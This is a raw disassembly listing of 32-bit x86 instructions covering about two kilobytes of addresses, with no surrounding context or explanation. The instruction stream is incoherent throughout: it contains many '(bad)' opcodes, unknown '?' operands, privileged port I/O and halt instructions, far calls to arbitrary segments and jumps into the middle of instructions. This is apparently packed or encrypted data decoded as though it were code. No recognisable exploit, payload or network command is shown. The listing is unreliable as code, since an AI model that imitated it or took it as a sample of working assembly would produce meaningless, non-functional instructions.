  41a70f:	mov    DWORD PTR [ebp-0x384d0590],edx
  41a715:	mov    dh,0x1b
  41a717:	and    al,0x6a
  41a719:	cmp    edx,edi
  41a71b:	inc    esp
  41a71c:	jle    0x41a767
  41a71e:	push   0x29
  41a720:	ficomp WORD PTR [ebp+0x14faac2]
  41a726:	(bad)  
  41a727:	jmp    DWORD PTR [bp+si+0x54]
  41a72b:	data16 je 0x41a796
  41a72e:	sbb    ebp,ecx
  41a730:	pusha  
  41a731:	cmp    BYTE PTR [ecx],ah
  41a733:	or     eax,0x8a8eb63c
  41a738:	and    DWORD PTR ds:0xf9998773,edi
  41a73e:	repz (bad) 
  41a741:	inc    ecx
  41a742:	int3   
  41a743:	std    
  41a744:	push   ss
  41a745:	pop    ebp
  41a746:	or     eax,0x53432380
  41a74b:	jne    0x41a7b4
  41a74d:	push   ebp
  41a74e:	adc    ecx,esp
  41a750:	xchg   ecx,eax
  41a751:	retf   
  41a752:	pop    esp
  41a753:	inc    ebp
  41a754:	cs sahf 
  41a756:	inc    eax
  41a757:	mov    ebp,0x20b15f8a
  41a75c:	cmp    BYTE PTR [ebp+0x57b02bc6],dh
  41a762:	fadd   DWORD PTR [ebx-0x2a]
  41a765:	cli    
  41a766:	cmp    BYTE PTR [edx+ecx*2+0x0],cl
  41a76a:	or     edi,DWORD PTR [edx]
  41a76c:	xchg   BYTE PTR [esi-0x13],ah
  41a76f:	cmp    BYTE PTR [ebx+0x26bc33b],cl
  41a775:	aad    0xa2
  41a777:	pop    edi
  41a778:	imul   edi,DWORD PTR ds:0xe36c5ee5,0x4e3e42fd
  41a782:	jle    0x41a7d7
  41a784:	mov    al,ds:0x8b803767
  41a789:	imul   esp,DWORD PTR [edi+0x1d],0xfffffff3
  41a78d:	in     eax,0x9e
  41a78f:	rcl    DWORD PTR [edi+0x12fb3eac],0x57
  41a796:	retf   0x3413
  41a799:	push   cs
  41a79a:	xchg   BYTE PTR [ebx+0x30363bf2],cl
  41a7a0:	pop    ebx
  41a7a1:	sub    bl,BYTE PTR [edi-0x41]
  41a7a4:	bnd jmp 0x3b55ffa0
  41a7aa:	or     BYTE PTR [ebx-0x58],dl
  41a7ad:	in     eax,dx
  41a7ae:	ret    
  41a7af:	ds in  eax,0x7e
  41a7b2:	je     0x41a7f5
  41a7b4:	mov    ds:0x1d20c9ce,eax
  41a7b9:	leave  
  41a7ba:	pop    ebp
  41a7bb:	xor    BYTE PTR [ebp+0x23ab45a3],dh
  41a7c1:	loop   0x41a743
  41a7c3:	fcom   DWORD PTR ds:0x94de9b8
  41a7c9:	sub    BYTE PTR [edi-0x5f743dde],cl
  41a7cf:	jnp    0x41a7d8
  41a7d1:	jge    0x41a7e6
  41a7d3:	pop    es
  41a7d4:	pushf  
  41a7d5:	adc    BYTE PTR [ecx],0x26
  41a7d8:	mov    bh,0x86
  41a7da:	aad    0x39
  41a7dc:	dec    ebp
  41a7dd:	sub    al,0x59
  41a7df:	push   esi
  41a7e0:	xchg   esi,eax
  41a7e1:	arpl   WORD PTR [ebp-0x64],bx
  41a7e4:	arpl   WORD PTR fs:[ebx+0x30],bp
  41a7e8:	inc    eax
  41a7e9:	fcmovbe st,st(0)
  41a7eb:	jne    0x41a852
  41a7ed:	xor    BYTE PTR ss:[edi+0x49],dl
  41a7f1:	pop    ebp
  41a7f2:	sub    bl,0x6a
  41a7f5:	clc    
  41a7f6:	sbb    al,0x3d
  41a7f8:	shl    esi,1
  41a7fa:	repz jmp 0x41a7f5
  41a7fd:	cmp    esi,DWORD PTR [ecx-0x3b9fa2f3]
  41a803:	hlt    
  41a804:	pop    eax
  41a805:	add    esi,edx
  41a807:	pop    ecx
  41a808:	adc    eax,0x8acbfb33
  41a80d:	inc    esi
  41a80e:	in     al,0x15
  41a810:	adc    BYTE PTR ds:0x570f67a8,bh
  41a816:	add    BYTE PTR [ebp-0x720bd032],0x4b
  41a81d:	inc    edx
  41a81e:	(bad)  
  41a81f:	cmc    
  41a820:	dec    esi
  41a821:	sahf   
  41a822:	jecxz  0x41a88d
  41a824:	clc    
  41a825:	out    dx,al
  41a826:	call   0x49c2:0x32d41c6c
  41a82d:	fdiv   st(4),st
  41a830:	je     0x41a7ce
  41a832:	sub    ebx,esi
  41a834:	xchg   edi,eax
  41a835:	pop    edx
  41a836:	mov    edx,0x808f3c84
  41a83b:	sub    bl,dh
  41a83d:	mov    ebx,0x78435e62
  41a842:	or     bl,dh
  41a844:	outs   dx,BYTE PTR ds:[esi]
  41a845:	mov    esi,0x486db95f
  41a84a:	push   eax
  41a84b:	add    eax,0x7a5a3559
  41a850:	sbb    BYTE PTR [eax+0x72],0xdf
  41a854:	arpl   WORD PTR es:[eax+0x6acee31a],sp
  41a85b:	imul   BYTE PTR [ecx]
  41a85d:	sar    bh,cl
  41a85f:	dec    esp
  41a860:	fsubr  st(7),st
  41a862:	inc    ecx
  41a863:	cmc    
  41a864:	scas   eax,DWORD PTR es:[edi]
  41a865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a866:	push   0x68d91e03
  41a86b:	imul   esp,DWORD PTR [edi],0xbd72f816
  41a871:	out    0x79,al
  41a873:	dec    edi
  41a874:	mov    ecx,0x1980b63f
  41a879:	fistp  QWORD PTR [esi]
  41a87b:	(bad)  
  41a87c:	and    DWORD PTR [edx-0x217cffc6],0xd9db9e9
  41a886:	dec    ebx
  41a887:	xchg   BYTE PTR [edi-0x75228eed],dl
  41a88d:	pop    esp
  41a88e:	in     eax,0xa1
  41a890:	inc    ecx
  41a891:	inc    ebx
  41a892:	mov    fs,WORD PTR [ebp-0x46]
  41a895:	adc    DWORD PTR [eax-0x708c6a9b],0x1a
  41a89c:	push   esi
  41a89d:	clc    
  41a89e:	aas    
  41a89f:	pusha  
  41a8a0:	aaa    
  41a8a1:	cdq    
  41a8a2:	imul   BYTE PTR [ecx]
  41a8a4:	int3   
  41a8a5:	dec    edx
  41a8a6:	fcomi  st,st(2)
  41a8a8:	push   edx
  41a8a9:	fld    DWORD PTR [edx]
  41a8ab:	hlt    
  41a8ac:	out    dx,al
  41a8ad:	adc    al,BYTE PTR [eax+ecx*1-0x20]
  41a8b1:	(bad)  
  41a8b2:	sar    DWORD PTR [eax-0xe],1
  41a8b5:	sub    eax,0x202e6c36
  41a8ba:	sti    
  41a8bb:	int3   
  41a8bc:	sbb    DWORD PTR [esi],ebx
  41a8be:	sub    BYTE PTR [eax+0x7f38785e],dl
  41a8c4:	and    BYTE PTR [eax+0x60],bl
  41a8c7:	fs int 0x8d
  41a8ca:	mov    WORD PTR [ecx-0x9],?
  41a8cd:	ret    
  41a8ce:	test   al,0x1c
  41a8d0:	std    
  41a8d1:	mov    ah,0x1c
  41a8d3:	and    ebx,DWORD PTR [ebp+0x49]
  41a8d6:	sbb    ah,BYTE PTR [eax-0x4f]
  41a8d9:	sbb    al,0xb6
  41a8db:	adc    cl,BYTE PTR [ebx]
  41a8dd:	xchg   edi,eax
  41a8de:	imul   ebx,DWORD PTR [ebx],0x5b
  41a8e1:	mov    esp,0x1f5263c0
  41a8e6:	jge    0x41a938
  41a8e8:	sub    ebp,DWORD PTR [ecx]
  41a8ea:	sbb    al,0x19
  41a8ec:	mov    dl,0x14
  41a8ee:	aam    0x19
  41a8f0:	sbb    eax,0x52a3729f
  41a8f5:	ror    BYTE PTR [eax+0x78eda2c1],1
  41a8fb:	mov    esi,0x9ff346ba
  41a900:	cld    
  41a901:	outs   dx,DWORD PTR ds:[esi]
  41a902:	js     0x41a908
  41a904:	xchg   ebx,eax
  41a905:	dec    esp
  41a906:	and    ah,BYTE PTR [edi+0x11b226b9]
  41a90c:	jecxz  0x41a92b
  41a90e:	push   ebp
  41a90f:	cmp    BYTE PTR [eax+0x42],ch
  41a912:	in     eax,0x37
  41a914:	and    ebx,DWORD PTR [esi]
  41a916:	adc    BYTE PTR [edx-0x30],bh
  41a919:	jae    0x41a959
  41a91b:	dec    BYTE PTR [esi]
  41a91d:	cmp    eax,0xe0f185ed
  41a922:	push   0xffffffbc
  41a924:	call   0x8686:0x83ca3c73
  41a92b:	scas   eax,DWORD PTR es:[edi]
  41a92c:	hlt    
  41a92d:	jge    0x41a959
  41a92f:	stc    
  41a930:	loop   0x41a8e9
  41a932:	pop    es
  41a933:	add    bh,BYTE PTR fs:[ebp+ecx*8-0x5]
  41a938:	mov    edx,0xdb9e698d
  41a93d:	aaa    
  41a93e:	adc    BYTE PTR [ebp+0x130c45a4],al
  41a944:	cmp    al,0x58
  41a946:	mov    bh,BYTE PTR [ebx-0x37]
  41a949:	mov    al,0xf5
  41a94b:	dec    esp
  41a94c:	add    al,0xc2
  41a94e:	clc    
  41a94f:	jge    0x41a96a
  41a951:	sub    eax,0x89451dd4
  41a956:	nop
  41a957:	inc    ecx
  41a958:	pop    esi
  41a959:	inc    esp
  41a95a:	mov    edx,ebp
  41a95c:	es pusha 
  41a95e:	lds    edi,FWORD PTR [edi-0x1ff689c7]
  41a964:	sbb    edi,esp
  41a966:	sub    BYTE PTR [ecx+0x7e],0x35
  41a96a:	hlt    
  41a96b:	and    bh,ch
  41a96d:	(bad)  
  41a96e:	into   
  41a96f:	dec    ebx
  41a970:	data16 add bh,BYTE PTR ds:0xb32d3676
  41a977:	call   0x271d:0x85290c0a
  41a97e:	sbb    al,0x0
  41a980:	ja     0x41a959
  41a982:	add    BYTE PTR [edi+ecx*2+0x309ebbbd],cl
  41a989:	mov    ch,0x73
  41a98b:	lods   eax,DWORD PTR ds:[esi]
  41a98c:	push   edx
  41a98d:	add    BYTE PTR [ebx-0x1d3bb25],0x8a
  41a994:	jmp    0x167bb998
  41a999:	sub    dl,ah
  41a99b:	push   0xd927560
  41a9a0:	fisubr WORD PTR [edi]
  41a9a2:	and    BYTE PTR [esi+0x469f64e7],0x39
  41a9a9:	xor    dl,ch
  41a9ab:	shl    BYTE PTR [si+0x33],1
  41a9af:	les    ecx,FWORD PTR [eax]
  41a9b1:	call   0x819c:0x1f8a2ed3
  41a9b8:	inc    ebx
  41a9b9:	mov    ch,0x8d
  41a9bb:	mov    ds:0xcb85fbaa,eax
  41a9c0:	in     al,0x2f
  41a9c2:	add    dl,al
  41a9c4:	xor    al,0x9b
  41a9c6:	sahf   
  41a9c7:	push   edx
  41a9c8:	(bad)  
  41a9c9:	pop    ebx
  41a9ca:	outs   dx,DWORD PTR ds:[esi]
  41a9cb:	pop    esp
  41a9cc:	mov    ebp,0x8d111cb5
  41a9d1:	xlat   BYTE PTR ds:[ebx]
  41a9d2:	push   0xffffffc0
  41a9d4:	cmp    eax,0xf1794f52
  41a9d9:	inc    esi
  41a9da:	cmp    ebx,DWORD PTR [edx-0x2dcaffa4]
  41a9e0:	mov    esi,0xb125876f
  41a9e5:	xchg   esi,eax
  41a9e6:	fcomp  QWORD PTR [edi]
  41a9e8:	inc    esp
  41a9e9:	rep lods eax,DWORD PTR ds:[esi]
  41a9eb:	popf   
  41a9ec:	int3   
  41a9ed:	adc    al,0xaf
  41a9ef:	aad    0x7d
  41a9f1:	repnz sub al,BYTE PTR [esi+0x35]
  41a9f5:	and    BYTE PTR [edi],dl
  41a9f7:	pop    ss
  41a9f8:	gs pop ebx
  41a9fa:	pop    eax
  41a9fb:	fwait
  41a9fc:	and    dh,0xaa
  41a9ff:	pop    ecx
  41aa00:	mov    eax,0xbb918de5
  41aa05:	into   
  41aa06:	sub    al,bh
  41aa08:	in     al,dx
  41aa09:	mov    al,ds:0xcbe3773a
  41aa0e:	fisub  DWORD PTR [esi-0x71829294]
  41aa14:	ss xchg ax,ax
  41aa17:	sub    al,0x42
  41aa19:	stos   BYTE PTR es:[edi],al
  41aa1a:	stc    
  41aa1b:	jno    0x41aa13
  41aa1d:	jbe    0x41aa67
  41aa1f:	sbb    bh,BYTE PTR [edx]
  41aa21:	out    0xee,al
  41aa23:	add    eax,ebp
  41aa25:	sub    DWORD PTR [edi-0x75],esi
  41aa28:	mov    bh,0x56
  41aa2a:	dec    eax
  41aa2b:	mov    ebx,0xc1c0f2f6
  41aa30:	or     BYTE PTR [esi+ebx*1+0x20],dl
  41aa34:	enter  0x6618,0xf9
  41aa38:	or     cl,dl
  41aa3a:	call   0xb5f2:0xad5d1dd7
  41aa41:	sbb    eax,0x89b8d57a
  41aa46:	pop    ebp
  41aa47:	dec    eax
  41aa48:	jbe    0x41aa8e
  41aa4a:	shr    dh,cl
  41aa4c:	adc    ch,BYTE PTR [ecx]
  41aa4e:	out    0x5e,eax
  41aa50:	adc    BYTE PTR [ecx-0x3f],cl
  41aa53:	data16 mov bl,0xd9
  41aa56:	mov    eax,ds:0xe04690b
  41aa5b:	rcl    BYTE PTR [ecx-0x103a1eb3],1
  41aa61:	cmp    DWORD PTR [esi+0x76],edi
  41aa64:	inc    eax
  41aa65:	adc    esi,DWORD PTR [eax-0xa]
  41aa68:	push   cs
  41aa69:	imul   eax,DWORD PTR [esp+edx*2],0xd58edcd8
  41aa70:	sub    eax,0x23235133
  41aa75:	gs inc ebx
  41aa77:	sbb    eax,0x35ef6bbf
  41aa7c:	leave  
  41aa7d:	xchg   esp,eax
  41aa7e:	mov    edx,esp
  41aa80:	mov    ?,ecx
  41aa82:	push   esp
  41aa83:	cli    
  41aa84:	leave  
  41aa85:	cmp    al,0x13
  41aa87:	pop    ecx
  41aa88:	retf   
  41aa89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa8a:	pop    ebx
  41aa8b:	xor    eax,0x440ae8d0
  41aa90:	sahf   
  41aa91:	inc    ebp
  41aa92:	adc    al,0xcb
  41aa94:	call   0x4b1a:0x3e9110bd
  41aa9b:	dec    eax
  41aa9c:	int3   
  41aa9d:	in     eax,0xa5
  41aa9f:	out    0x1e,eax
  41aaa1:	xor    al,0xea
  41aaa3:	sahf   
  41aaa4:	cmp    BYTE PTR [edx],0x42
  41aaa7:	sub    BYTE PTR [ebp-0x7b],bh
  41aaaa:	xor    BYTE PTR [esi],bl
  41aaac:	mov    ebp,0xdc467a6f
  41aab1:	and    al,0x6d
  41aab3:	adc    al,BYTE PTR [ecx+ebx*2-0x6]
  41aab7:	adc    BYTE PTR [edi+0x3d93f01f],al
  41aabd:	ds (bad) 
  41aabf:	in     al,0x65
  41aac1:	sbb    DWORD PTR [ebx+0x58],ebx
  41aac4:	inc    ecx
  41aac5:	in     al,dx
  41aac6:	imul   edx,DWORD PTR [edx-0x54],0x65
  41aaca:	in     al,dx
  41aacb:	sub    DWORD PTR ds:0xe20a057a,esi
  41aad1:	(bad)  
  41aad2:	rcr    DWORD PTR [eax+ebx*4-0x16],1
  41aad6:	leave  
  41aad7:	arpl   WORD PTR [ebp-0x62],ax
  41aada:	out    0xad,al
  41aadc:	or     dl,dh
  41aade:	lods   eax,DWORD PTR ds:[esi]
  41aadf:	data16 stc 
  41aae1:	xchg   esp,eax
  41aae2:	lahf   
  41aae3:	call   FWORD PTR [ecx-0x34]
  41aae6:	into   
  41aae7:	cmp    DWORD PTR [ebx],eax
  41aae9:	lds    ebx,FWORD PTR [edi*1+0x1aac36b1]
  41aaf0:	xlat   BYTE PTR ds:[ebx]
  41aaf1:	inc    esp
  41aaf2:	and    DWORD PTR [edx],edi
  41aaf4:	mov    eax,DWORD PTR [ebx+esi*2+0x55]
  41aaf8:	push   0xf61f0a8c
  41aafd:	(bad)  
  41aafe:	das    
  41aaff:	sub    bh,0xef
  41ab02:	mov    bl,ch
  41ab04:	out    0x28,eax
  41ab06:	cmp    BYTE PTR [esi+0x7e],bh
  41ab09:	dec    edx
  41ab0a:	test   BYTE PTR [esi],ch
  41ab0c:	xchg   ecx,eax
  41ab0d:	adc    al,0xa3
  41ab0f:	mov    DWORD PTR [esi+0x50],eax
  41ab12:	out    dx,al
  41ab13:	mov    ebx,0x9ed51eac
  41ab18:	hlt    
  41ab19:	out    dx,al
  41ab1a:	mov    DWORD PTR [ebx-0x433357ed],0x952c4ca6
  41ab24:	push   esi
  41ab25:	cmp    ecx,DWORD PTR [esi-0x2e65423f]
  41ab2b:	inc    eax
  41ab2c:	test   BYTE PTR [edx+0x57],cl
  41ab2f:	push   cs
  41ab30:	adc    eax,0x19c6a256
  41ab35:	in     eax,0xb4
  41ab37:	cdq    
  41ab38:	jbe    0x41aba1
  41ab3a:	in     eax,0x3d
  41ab3c:	sti    
  41ab3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab3e:	push   esp
  41ab3f:	xor    BYTE PTR ds:0x5b0f11c9,0x42
  41ab46:	add    dl,BYTE PTR [edx]
  41ab48:	(bad)  
  41ab49:	jle    0x41ab00
  41ab4b:	adc    BYTE PTR [ebx-0x62],dl
  41ab4e:	add    bh,bl
  41ab50:	xor    edx,edx
  41ab52:	push   es
  41ab53:	push   0x19
  41ab55:	leave  
  41ab56:	outs   dx,BYTE PTR ds:[esi]
  41ab57:	xchg   esi,eax
  41ab58:	fimul  WORD PTR [ecx-0x3a]
  41ab5b:	mov    DWORD PTR [edx],esp
  41ab5d:	push   ebx
  41ab5e:	dec    esi
  41ab5f:	cmp    ah,BYTE PTR [edx]
  41ab61:	push   edi
  41ab62:	mov    edi,0xac416fcd
  41ab67:	cmp    eax,0x60265ff4
  41ab6c:	sbb    al,0x44
  41ab6e:	not    BYTE PTR [ebx-0x2b0a8d62]
  41ab74:	fwait
  41ab75:	xchg   edx,eax
  41ab76:	pop    es
  41ab77:	cmp    al,0xd7
  41ab79:	ret    
  41ab7a:	and    DWORD PTR [edi-0x1d38a1e6],ebp
  41ab80:	cdq    
  41ab81:	sub    DWORD PTR [edi+ebx*4-0x53],edi
  41ab85:	push   ebp
  41ab86:	jne    0x41ab23
  41ab88:	dec    ebp
  41ab89:	mov    cl,0x30
  41ab8b:	out    0x36,al
  41ab8d:	and    al,0xca
  41ab8f:	xchg   ebp,eax
  41ab90:	mov    dl,0x56
  41ab92:	icebp  
  41ab93:	xchg   DWORD PTR [ebx],ebx
  41ab95:	sbb    DWORD PTR ds:0x2b370539,edx
  41ab9b:	retf   
  41ab9c:	fnstsw WORD PTR ds:0x6e9d1c88
  41aba2:	sbb    al,0x7d
  41aba4:	push   0xe61c5e28
  41aba9:	mov    al,ds:0x107ca618
  41abae:	je     0x41abf9
  41abb0:	adc    BYTE PTR [edx],dh
  41abb2:	mov    DWORD PTR [ebx+0x2e],edi
  41abb5:	shr    BYTE PTR [esi+0x27253ebb],0x1f
  41abbc:	fs pop ebp
  41abbe:	jae    0x41aba1
  41abc0:	sbb    al,0xcd
  41abc2:	scas   al,BYTE PTR es:[edi]
  41abc3:	xor    esi,0x1978cc03
  41abc9:	sub    bh,BYTE PTR [eax+0x1294bf60]
  41abcf:	outs   dx,BYTE PTR ds:[esi]
  41abd0:	fwait
  41abd1:	int3   
  41abd2:	out    dx,al
  41abd3:	pop    ds
  41abd4:	or     DWORD PTR [ecx-0x12],0x30
  41abd8:	(bad)  
  41abd9:	scas   eax,DWORD PTR es:[edi]
  41abda:	loope  0x41ac3c
  41abdc:	packsswb mm4,QWORD PTR [edx-0x72]
  41abe0:	pop    ds
  41abe1:	neg    DWORD PTR [edx-0x7cebd58]
  41abe7:	int    0xf9
  41abe9:	mov    ?,WORD PTR ds:0xc9d6e71
  41abef:	cdq    
  41abf0:	cld    
  41abf1:	mov    dh,0x2b
  41abf3:	or     dh,bh
  41abf5:	inc    ebx
  41abf6:	fwait
  41abf7:	sar    DWORD PTR [ebx],1
  41abf9:	mov    ds:0x3527858b,eax
  41abfe:	jne    0x41abfb
  41ac00:	adc    BYTE PTR [ebx],bh
  41ac02:	sub    edi,DWORD PTR [ebp-0x7cb6ad5a]
  41ac08:	ret    
  41ac09:	push   0xffffffed
  41ac0b:	sub    eax,0x65d70fa7
  41ac10:	adc    ebx,eax
  41ac12:	and    al,0x1b
  41ac14:	loopne 0x41ac0c
  41ac16:	xchg   al,dh
  41ac18:	(bad)  
  41ac19:	push   ds
  41ac1a:	xor    BYTE PTR [edi-0x5fcf3b11],al
  41ac20:	sbb    eax,0xeeb525b0
  41ac25:	xor    DWORD PTR [ebx+0x179a8816],edi
  41ac2b:	inc    edx
  41ac2c:	cdq    
  41ac2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac2e:	out    0x19,al
  41ac30:	enter  0xa23b,0x4e
  41ac34:	stos   DWORD PTR es:[edi],eax
  41ac35:	in     al,0xeb
  41ac37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac38:	pop    edx
  41ac39:	pop    eax
  41ac3a:	arpl   ax,si
  41ac3c:	xchg   esp,eax
  41ac3d:	ret    0x2ee7
  41ac40:	pop    ds
  41ac41:	xor    BYTE PTR [esi],0x9a
  41ac44:	nop
  41ac45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac46:	mov    esi,0x48876b01
  41ac4b:	iret   
  41ac4c:	and    esi,DWORD PTR [ecx-0x34aaab14]
  41ac52:	dec    eax
  41ac53:	aas    
  41ac54:	xor    al,0xa0
  41ac56:	lahf   
  41ac57:	nop
  41ac58:	and    esp,DWORD PTR [edi+0x1c]
  41ac5b:	icebp  
  41ac5c:	nop
  41ac5d:	rcr    esp,0x9e
  41ac60:	sub    dl,BYTE PTR [ebp+0x3b]
  41ac63:	call   0x97d50973
  41ac68:	sbb    al,0xc3
  41ac6a:	fcmovu st,st(1)
  41ac6c:	and    DWORD PTR ds:0x2d75c752,eax
  41ac72:	push   esi
  41ac73:	mov    cl,0x29
  41ac75:	mov    BYTE PTR [ecx],ch
  41ac77:	mov    ds:0xb41d7403,al
  41ac7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac7d:	lods   eax,DWORD PTR ds:[esi]
  41ac7e:	scas   al,BYTE PTR es:[edi]
  41ac7f:	scas   al,BYTE PTR es:[edi]
  41ac80:	lods   al,BYTE PTR ds:[esi]
  41ac81:	ja     0x41ac87
  41ac83:	adc    dh,BYTE PTR ds:[edx+esi*8-0x780ce943]
  41ac8b:	(bad)  
  41ac8c:	cmc    
  41ac8d:	and    esp,ebx
  41ac8f:	xchg   ecx,eax
  41ac90:	fcmovnu st,st(1)
  41ac92:	test   BYTE PTR [ebx-0x70c244ab],0x99
  41ac99:	sub    bl,cl
  41ac9b:	ret    0xeab6
  41ac9e:	scas   al,BYTE PTR es:[edi]
  41ac9f:	xchg   edi,eax
  41aca0:	jle    0x41acda
  41aca2:	push   edi
  41aca3:	in     eax,0x50
  41aca5:	imul   esp,DWORD PTR [edx+ebp*4],0xffffffdf
  41aca9:	test   eax,0x45603286
  41acae:	and    BYTE PTR [ebp-0x62ccdffc],0x5c
  41acb5:	dec    esp
  41acb6:	test   DWORD PTR [edx],ebp
  41acb8:	stos   BYTE PTR es:[edi],al
  41acb9:	push   0x9723648e
  41acbe:	sub    BYTE PTR [ecx+edi*2+0x75],ch
  41acc2:	leave  
  41acc3:	lahf   
  41acc4:	test   DWORD PTR [edx],esi
  41acc6:	out    dx,al
  41acc7:	sub    eax,0x2fe59b35
  41accc:	mov    eax,ds:0xd04b4448
  41acd1:	jo     0x41ad04
  41acd3:	ss dec edi
  41acd5:	sub    BYTE PTR [ebp+0xcc2c27b],bh
  41acdb:	fld    DWORD PTR [edx-0x31]
  41acde:	add    eax,DWORD PTR [eax+edi*2+0x62]
  41ace2:	lock mov bh,0x8a
  41ace5:	xchg   DWORD PTR [eax+0xa],esi
  41ace8:	das    
  41ace9:	jle    0x41ac80
  41aceb:	inc    ebp
  41acec:	ss stos BYTE PTR es:[edi],al
  41acee:	data16 or al,0xa7
  41acf1:	mov    al,ds:0x5bc92e8e
  41acf6:	je     0x41ad70
  41acf8:	sbb    al,0xff
  41acfa:	test   DWORD PTR [ebx+0x7bf8c12b],eax
  41ad00:	adc    BYTE PTR [edx+0x7a8cbf96],cl
  41ad06:	mov    ah,0x24
  41ad08:	mov    al,0xb
  41ad0a:	push   ebp
  41ad0b:	sub    eax,edx
  41ad0d:	imul   ebp,DWORD PTR [ecx-0x56c396a4],0xf272377a
  41ad17:	pusha  
  41ad18:	mov    DWORD PTR [eax],edx
  41ad1a:	xor    BYTE PTR [ecx+edx*2],al
  41ad1d:	mul    DWORD PTR [edx-0x6b6e9dc]
  41ad23:	mul    BYTE PTR [ebx+0x3e]
  41ad26:	jmp    0xdb5e1fbe
  41ad2b:	scas   eax,DWORD PTR es:[edi]
  41ad2c:	movq   mm7,QWORD PTR [ecx+edx*2+0x57]
  41ad31:	scas   al,BYTE PTR es:[edi]
  41ad32:	test   BYTE PTR [esi],0xbd
  41ad35:	lods   al,BYTE PTR ds:[esi]
  41ad36:	call   0x8957:0xcadcca1f
  41ad3d:	inc    eax
  41ad3e:	fcmovu st,st(4)
  41ad40:	popa   
  41ad41:	xchg   ebx,eax
  41ad42:	pushf  
  41ad43:	or     esp,DWORD PTR [edx]
  41ad45:	int    0xe5
  41ad47:	mov    ebp,0x1781be31
  41ad4c:	sub    BYTE PTR [ecx+0x7c],dl
  41ad4f:	mov    DWORD PTR [edi-0x4c48af6f],esi
  41ad55:	mov    cl,0x21
  41ad57:	addr16 xor eax,0xb47acbb6
  41ad5d:	jo     0x41ad45
  41ad5f:	das    
  41ad60:	and    ah,BYTE PTR [ebp+0xfb0fa4a]
  41ad66:	ja     0x41ad6c
  41ad68:	lock or dl,ch
  41ad6b:	ja     0x41add2
  41ad6d:	sbb    cl,BYTE PTR [edi+0x4066765f]
  41ad73:	dec    esp
  41ad74:	xor    ah,BYTE PTR [edi-0x4f]
  41ad77:	and    ecx,eax
  41ad79:	and    al,0x4e
  41ad7b:	mov    edi,0x2b3553db
  41ad80:	xor    eax,0xccec5509
  41ad85:	or     dh,BYTE PTR [ecx+0x39]
  41ad88:	jno    0x41adad
  41ad8a:	out    dx,eax
  41ad8b:	ret    
  41ad8c:	mov    al,ds:0x779b6594
  41ad91:	mov    edx,DWORD PTR [ecx+0x40cf8d4d]
  41ad97:	mov    al,0x52
  41ad99:	add    ebx,DWORD PTR [esi]
  41ad9b:	mov    al,ds:0x31130037
  41ada0:	mov    cl,0xc4
  41ada2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ada3:	lock pop DWORD PTR ds:0xe836ecb9
  41adaa:	inc    edx
  41adab:	repnz push cs
  41adad:	test   eax,0x2cda8887
  41adb2:	loop   0x41adcc
  41adb4:	mov    ebx,0xe9815ba9
  41adb9:	sbb    BYTE PTR [eax+eax*1-0x1e],cl
  41adbd:	mov    ds:0xcb85cc9c,al
  41adc2:	shr    ecx,1
  41adc4:	test   al,0xf4
  41adc6:	xor    dl,BYTE PTR [ebp-0x68]
  41adc9:	dec    edx
  41adca:	out    0x7f,al
  41adcc:	arpl   WORD PTR [ebx+0xe],bp
  41adcf:	les    ecx,FWORD PTR [eax+0x24]
  41add2:	sub    edx,esi
  41add4:	mov    dl,0xd3
  41add6:	pop    eax
  41add7:	int3   
  41add8:	push   ss
  41add9:	mov    esp,0xec8aabae
  41adde:	repz xchg esi,eax
  41ade0:	jmp    0xb6db:0xba38b211
  41ade7:	hlt    
  41ade8:	es out 0x19,eax
  41adeb:	lods   al,BYTE PTR ds:[esi]
  41adec:	lods   eax,DWORD PTR ds:[esi]
  41aded:	loopne 0x41ae19
  41adef:	inc    ebx
  41adf0:	adc    BYTE PTR [edx],cl
  41adf2:	and    ah,BYTE PTR [edx+0x1dd3f8f1]
  41adf8:	enter  0xe161,0xd8
  41adfc:	inc    ebp
  41adfd:	push   ss
  41adfe:	imul   ebx,DWORD PTR ds:0x380e7b99,0x65
  41ae05:	push   eax
  41ae06:	add    ecx,0x3547759f
  41ae0c:	and    eax,0x391d6ae0
  41ae11:	lods   eax,DWORD PTR ds:[esi]
  41ae12:	adc    dl,BYTE PTR ds:0x157c387f
  41ae18:	lds    eax,FWORD PTR ds:0x86d2e9ad
  41ae1e:	push   esp
  41ae1f:	mov    esp,0x9699d81d
  41ae24:	fwait
  41ae25:	cmp    esi,DWORD PTR [edi-0x479e8d0e]
  41ae2b:	mov    BYTE PTR [edx+esi*1+0x7c],ch
  41ae2f:	mov    dh,0xc
  41ae31:	sub    eax,0x4b87a39e
  41ae36:	ins    DWORD PTR es:[edi],dx
  41ae37:	jg     0x41ae41
  41ae39:	push   edi
  41ae3a:	mov    al,ds:0x6b6c619c
  41ae3f:	popa   
  41ae40:	sbb    bl,BYTE PTR [edx-0x1f]
  41ae43:	add    al,0xad
  41ae45:	mov    ?,WORD PTR [edx+0x4]
  41ae48:	pop    ss
  41ae49:	add    bl,al
  41ae4b:	add    DWORD PTR [ebp+ebp*1+0x48784c4a],0xaa8bbf80
  41ae56:	pop    ds
  41ae57:	add    al,0x67
  41ae59:	hlt    
  41ae5a:	test   ebp,eax
  41ae5c:	retf   0x1e85
  41ae5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae60:	xor    DWORD PTR [edi-0x49],eax
  41ae63:	ds pop esi
  41ae65:	cmp    eax,0x7b74a23d
  41ae6a:	sbb    DWORD PTR [edi],0x278d0b3a
  41ae70:	jge    0x41aea2
  41ae72:	mov    esi,0xea978d0b
  41ae77:	dec    ecx
  41ae78:	rcr    bl,1
  41ae7a:	jp     0x41aece
  41ae7c:	and    eax,0x71dd5948
  41ae81:	xor    esi,ebp
  41ae83:	iret   
  41ae84:	jmp    0xef3535a7
  41ae89:	sub    al,0xd8
  41ae8b:	clc    
  41ae8c:	sbb    ebx,DWORD PTR [esi+0x1f]
  41ae8f:	retf   
  41ae90:	adc    eax,0xb5c7870f
  41ae95:	mov    esi,0x7a92c9f0
  41ae9a:	imul   esi,DWORD PTR [ebp-0x54],0x28
  41ae9e:	in     al,0x89
  41aea0:	xor    al,0xee
  41aea2:	(bad)  
